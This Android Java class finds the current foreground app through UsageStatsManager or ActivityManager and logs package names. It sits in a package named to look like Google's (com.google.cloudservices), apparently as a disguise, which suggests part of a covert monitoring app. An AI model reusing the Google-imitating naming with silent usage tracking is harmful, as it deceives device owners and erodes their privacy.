package com.google.cloudservices;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.os.Build;

import android.util.Log;

import java.util.Date;
import java.util.List;

public class CurrentAppClass {

    public  String getTopAppName(Context context) {

        String strName = "";
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                strName = getLollipopFGAppPackageName(context);
            } else {
                ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                strName = mActivityManager.getRunningTasks(1).get(0).topActivity.getClassName();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }finally {
        }
        return strName;
    }


    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private  String getLollipopFGAppPackageName(Context ctx) {
        UsageStatsManager usageStatsManager = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);
        try {

            long milliSecs = 60 * 1000;
            Date date = new Date();
            List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, date.getTime() - milliSecs, date.getTime());
            if (queryUsageStats.size() > 0) {

            }
            long recentTime = 0;
            String recentPkg = "";
            for (int i = 0; i < queryUsageStats.size(); i++) {
                UsageStats stats = queryUsageStats.get(i);


                if (i == 0 && !"org.pervacio.pvadiag".equals(stats.getPackageName())) {
                }
                if (stats.getLastTimeUsed() > recentTime) {
                    if (stats.getPackageName().equals("pro.tasking")){}else {
                        Log.e("reeeeetr", stats.getPackageName() );

                    recentTime = stats.getLastTimeUsed();
                    recentPkg = stats.getPackageName();
                    }

                }
            }
            Log.e("reeeeetr234", recentPkg);
            return recentPkg;
        } catch (Exception e) {
            e.printStackTrace();
        }finally {

        }
        return "";
    }
}
